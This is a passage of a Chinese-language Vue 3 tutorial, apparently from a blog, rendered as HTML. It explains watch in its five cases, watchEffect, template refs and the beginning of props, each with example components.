console.log(&#x27;有人修改了fullName&#x27;,val)</span><br><span class="line">      firstName.value = val.split(&#x27;-&#x27;)[0]</span><br><span class="line">      lastName.value = val.split(&#x27;-&#x27;)[1]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  function changeFullName()&#123;</span><br><span class="line">    fullName.value = &#x27;li-si&#x27;</span><br><span class="line">  &#125; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-9-【watch】">3.9.【watch】</h2><ul><li>作用：监视数据的变化（和<code>Vue2</code>中的<code>watch</code>作用一致）</li><li>特点：<code>Vue3</code>中的<code>watch</code>只能监视以下<strong>四种数据</strong>：</li></ul><blockquote><ol><li><code>ref</code>定义的数据。</li><li><code>reactive</code>定义的数据。</li><li>函数返回一个值（<code>getter</code>函数）。</li><li>一个包含上述内容的数组。</li></ol></blockquote><p>我们在<code>Vue3</code>中使用<code>watch</code>的时候，通常会遇到以下几种情况：</p><h3 id="情况一">* 情况一</h3><p>监视<code>ref</code>定义的【基本类型】数据：直接写数据名即可，监视的是其<code>value</code>值的改变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况一：监视【ref】定义的【基本类型】数据&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;当前求和为：&#123;&#123;sum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeSum&quot;&gt;点我sum+1&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,watch&#125; from &#x27;vue&#x27;</span><br><span class="line">  // 数据</span><br><span class="line">  let sum = ref(0)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeSum()&#123;</span><br><span class="line">    sum.value += 1</span><br><span class="line">  &#125;</span><br><span class="line">  // 监视，情况一：监视【ref】定义的【基本类型】数据</span><br><span class="line">  const stopWatch = watch(sum,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;sum变化了&#x27;,newValue,oldValue)</span><br><span class="line">    if(newValue &gt;= 10)&#123;</span><br><span class="line">      stopWatch()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="情况二">* 情况二</h3><p>监视<code>ref</code>定义的【对象类型】数据：直接写数据名，监视的是对象的【地址值】，若想监视对象内部的数据，要手动开启深度监视。</p><blockquote><p>注意：</p><ul><li><p>若修改的是<code>ref</code>定义的对象中的属性，<code>newValue</code> 和 <code>oldValue</code> 都是新值，因为它们是同一个对象。</p></li><li><p>若修改整个<code>ref</code>定义的对象，<code>newValue</code> 是新值， <code>oldValue</code> 是旧值，因为不是同一个对象了。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况二：监视【ref】定义的【对象类型】数据&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123; person.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changePerson&quot;&gt;修改整个人&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,watch&#125; from &#x27;vue&#x27;</span><br><span class="line">  // 数据</span><br><span class="line">  let person = ref(&#123;</span><br><span class="line">    name:&#x27;张三&#x27;,</span><br><span class="line">    age:18</span><br><span class="line">  &#125;)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    person.value.name += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    person.value.age += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changePerson()&#123;</span><br><span class="line">    person.value = &#123;name:&#x27;李四&#x27;,age:90&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  /* </span><br><span class="line">    监视，情况一：监视【ref】定义的【对象类型】数据，监视的是对象的地址值，若想监视对象内部属性的变化，需要手动开启深度监视</span><br><span class="line">    watch的第一个参数是：被监视的数据</span><br><span class="line">    watch的第二个参数是：监视的回调</span><br><span class="line">    watch的第三个参数是：配置对象（deep、immediate等等.....） </span><br><span class="line">  */</span><br><span class="line">  watch(person,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;,&#123;deep:true&#125;)</span><br><span class="line">  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="情况三">*  情况三</h3><p>监视<code>reactive</code>定义的【对象类型】数据，且默认开启了深度监视。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况三：监视【reactive】定义的【对象类型】数据&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123; person.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changePerson&quot;&gt;修改整个人&lt;/button&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h2&gt;测试：&#123;&#123;obj.a.b.c&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;test&quot;&gt;修改obj.a.b.c&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;reactive,watch&#125; from &#x27;vue&#x27;</span><br><span class="line">  // 数据</span><br><span class="line">  let person = reactive(&#123;</span><br><span class="line">    name:&#x27;张三&#x27;,</span><br><span class="line">    age:18</span><br><span class="line">  &#125;)</span><br><span class="line">  let obj = reactive(&#123;</span><br><span class="line">    a:&#123;</span><br><span class="line">      b:&#123;</span><br><span class="line">        c:666</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    person.name += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    person.age += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changePerson()&#123;</span><br><span class="line">    Object.assign(person,&#123;name:&#x27;李四&#x27;,age:80&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  function test()&#123;</span><br><span class="line">    obj.a.b.c = 888</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 监视，情况三：监视【reactive】定义的【对象类型】数据，且默认是开启深度监视的</span><br><span class="line">  watch(person,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;)</span><br><span class="line">  watch(obj,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;Obj变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="情况四">* 情况四</h3><p>监视<code>ref</code>或<code>reactive</code>定义的【对象类型】数据中的<strong>某个属性</strong>，注意点如下：</p><ol><li>若该属性值<strong>不是</strong>【对象类型】，需要写成函数形式。</li><li>若该属性值是<strong>依然</strong>是【对象类型】，可直接编，也可写成函数，建议写成函数。</li></ol><p>结论：监视的要是对象里的属性，那么最好写函数式，注意点：若是对象监视的是地址值，需要关注对象内部，需要手动开启深度监视。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况四：监视【ref】或【reactive】定义的【对象类型】数据中的某个属性&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123; person.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;汽车：&#123;&#123; person.car.c1 &#125;&#125;、&#123;&#123; person.car.c2 &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeC1&quot;&gt;修改第一台车&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeC2&quot;&gt;修改第二台车&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeCar&quot;&gt;修改整个车&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;reactive,watch&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let person = reactive(&#123;</span><br><span class="line">    name:&#x27;张三&#x27;,</span><br><span class="line">    age:18,</span><br><span class="line">    car:&#123;</span><br><span class="line">      c1:&#x27;奔驰&#x27;,</span><br><span class="line">      c2:&#x27;宝马&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    person.name += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    person.age += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changeC1()&#123;</span><br><span class="line">    person.car.c1 = &#x27;奥迪&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeC2()&#123;</span><br><span class="line">    person.car.c2 = &#x27;大众&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeCar()&#123;</span><br><span class="line">    person.car = &#123;c1:&#x27;雅迪&#x27;,c2:&#x27;爱玛&#x27;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 监视，情况四：监视响应式对象中的某个属性，且该属性是基本类型的，要写成函数式</span><br><span class="line">  /* watch(()=&gt; person.name,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person.name变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;) */</span><br><span class="line"></span><br><span class="line">  // 监视，情况四：监视响应式对象中的某个属性，且该属性是对象类型的，可以直接写，也能写函数，更推荐写函数</span><br><span class="line">  watch(()=&gt;person.car,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person.car变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;,&#123;deep:true&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="情况五">* 情况五</h3><p>监视上述的多个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;情况五：监视上述的多个数据&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;姓名：&#123;&#123; person.name &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;年龄：&#123;&#123; person.age &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;汽车：&#123;&#123; person.car.c1 &#125;&#125;、&#123;&#123; person.car.c2 &#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changeName&quot;&gt;修改名字&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeAge&quot;&gt;修改年龄&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeC1&quot;&gt;修改第一台车&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeC2&quot;&gt;修改第二台车&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeCar&quot;&gt;修改整个车&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;reactive,watch&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  // 数据</span><br><span class="line">  let person = reactive(&#123;</span><br><span class="line">    name:&#x27;张三&#x27;,</span><br><span class="line">    age:18,</span><br><span class="line">    car:&#123;</span><br><span class="line">      c1:&#x27;奔驰&#x27;,</span><br><span class="line">      c2:&#x27;宝马&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  // 方法</span><br><span class="line">  function changeName()&#123;</span><br><span class="line">    person.name += &#x27;~&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeAge()&#123;</span><br><span class="line">    person.age += 1</span><br><span class="line">  &#125;</span><br><span class="line">  function changeC1()&#123;</span><br><span class="line">    person.car.c1 = &#x27;奥迪&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeC2()&#123;</span><br><span class="line">    person.car.c2 = &#x27;大众&#x27;</span><br><span class="line">  &#125;</span><br><span class="line">  function changeCar()&#123;</span><br><span class="line">    person.car = &#123;c1:&#x27;雅迪&#x27;,c2:&#x27;爱玛&#x27;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 监视，情况五：监视上述的多个数据</span><br><span class="line">  watch([()=&gt;person.name,person.car],(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person.car变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;,&#123;deep:true&#125;)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-10-【watchEffect】">3.10. 【watchEffect】</h2><ul><li><p>官网：立即运行一个函数，同时响应式地追踪其依赖，并在依赖更改时重新执行该函数。</p></li><li><p><code>watch</code>对比<code>watchEffect</code></p><blockquote><ol><li><p>都能监听响应式数据的变化，不同的是监听数据变化的方式不同</p></li><li><p><code>watch</code>：要明确指出监视的数据</p></li><li><p><code>watchEffect</code>：不用明确指出监视的数据（函数中用到哪些属性，那就监视哪些属性）。</p></li></ol></blockquote></li><li><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1&gt;需求：水温达到50℃，或水位达到20cm，则联系服务器&lt;/h1&gt;</span><br><span class="line">    &lt;h2 id=&quot;demo&quot;&gt;水温：&#123;&#123;temp&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;h2&gt;水位：&#123;&#123;height&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;changePrice&quot;&gt;水温+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;changeSum&quot;&gt;水位+10&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,watch,watchEffect&#125; from &#x27;vue&#x27;</span><br><span class="line">  // 数据</span><br><span class="line">  let temp = ref(0)</span><br><span class="line">  let height = ref(0)</span><br><span class="line"></span><br><span class="line">  // 方法</span><br><span class="line">  function changePrice()&#123;</span><br><span class="line">    temp.value += 10</span><br><span class="line">  &#125;</span><br><span class="line">  function changeSum()&#123;</span><br><span class="line">    height.value += 1</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 用watch实现，需要明确的指出要监视：temp、height</span><br><span class="line">  watch([temp,height],(value)=&gt;&#123;</span><br><span class="line">    // 从value中获取最新的temp值、height值</span><br><span class="line">    const [newTemp,newHeight] = value</span><br><span class="line">    // 室温达到50℃，或水位达到20cm，立刻联系服务器</span><br><span class="line">    if(newTemp &gt;= 50 || newHeight &gt;= 20)&#123;</span><br><span class="line">      console.log(&#x27;联系服务器&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  // 用watchEffect实现，不用</span><br><span class="line">  const stopWtach = watchEffect(()=&gt;&#123;</span><br><span class="line">    // 室温达到50℃，或水位达到20cm，立刻联系服务器</span><br><span class="line">    if(temp.value &gt;= 50 || height.value &gt;= 20)&#123;</span><br><span class="line">      console.log(document.getElementById(&#x27;demo&#x27;)?.innerText)</span><br><span class="line">      console.log(&#x27;联系服务器&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">    // 水温达到100，或水位达到50，取消监视</span><br><span class="line">    if(temp.value === 100 || height.value === 50)&#123;</span><br><span class="line">      console.log(&#x27;清理了&#x27;)</span><br><span class="line">      stopWtach()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-11-【标签的-ref-属性】">3.11. 【标签的 ref 属性】</h2><p>作用：用于注册模板引用。</p><blockquote><ul><li><p>用在普通<code>DOM</code>标签上，获取的是<code>DOM</code>节点。</p></li><li><p>用在组件标签上，获取的是组件实例对象。</p></li></ul></blockquote><p>用在普通<code>DOM</code>标签上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">    &lt;h1 ref=&quot;title1&quot;&gt;尚硅谷&lt;/h1&gt;</span><br><span class="line">    &lt;h2 ref=&quot;title2&quot;&gt;前端&lt;/h2&gt;</span><br><span class="line">    &lt;h3 ref=&quot;title3&quot;&gt;Vue&lt;/h3&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; ref=&quot;inpt&quot;&gt; &lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;showLog&quot;&gt;点我打印内容&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  let title1 = ref()</span><br><span class="line">  let title2 = ref()</span><br><span class="line">  let title3 = ref()</span><br><span class="line"></span><br><span class="line">  function showLog()&#123;</span><br><span class="line">    // 通过id获取元素</span><br><span class="line">    const t1 = document.getElementById(&#x27;title1&#x27;)</span><br><span class="line">    // 打印内容</span><br><span class="line">    console.log((t1 as HTMLElement).innerText)</span><br><span class="line">    console.log((&lt;HTMLElement&gt;t1).innerText)</span><br><span class="line">    console.log(t1?.innerText)</span><br><span class="line">    </span><br><span class="line">/************************************/</span><br><span class="line"></span><br><span class="line">    // 通过ref获取元素</span><br><span class="line">    console.log(title1.value)</span><br><span class="line">    console.log(title2.value)</span><br><span class="line">    console.log(title3.value)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用在组件标签上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 父组件App.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;Person ref=&quot;ren&quot;/&gt;</span><br><span class="line">  &lt;button @click=&quot;test&quot;&gt;测试&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;App&quot;&gt;</span><br><span class="line">  import Person from &#x27;./components/Person.vue&#x27;</span><br><span class="line">  import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">  let ren = ref()</span><br><span class="line"></span><br><span class="line">  function test()&#123;</span><br><span class="line">    console.log(ren.value.name)</span><br><span class="line">    console.log(ren.value.age)</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件Person.vue中要使用defineExpose暴露内容 --&gt;</span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name=&quot;Person&quot;&gt;</span><br><span class="line">  import &#123;ref,defineExpose&#125; from &#x27;vue&#x27;</span><br><span class="line">// 数据</span><br><span class="line">  let name = ref(&#x27;张三&#x27;)</span><br><span class="line">  let age = ref(18)</span><br><span class="line">  /****************************/</span><br><span class="line">  /****************************/</span><br><span class="line">  // 使用defineExpose将组件中的数据交给外部</span><br><span class="line">  defineExpose(&#123;name,age&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="3-12-【props】">3.12. 【props】</h2><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">// 定义一个接口，限制每个Person对象的格式</span></span><br><span class="line"><span class="keyword">export</span> interface <span class="title class_">PersonInter</span> &#123;</span><br><span class="line"> <span class="attr">id</span>:string,</span><br><span class="line"> <span 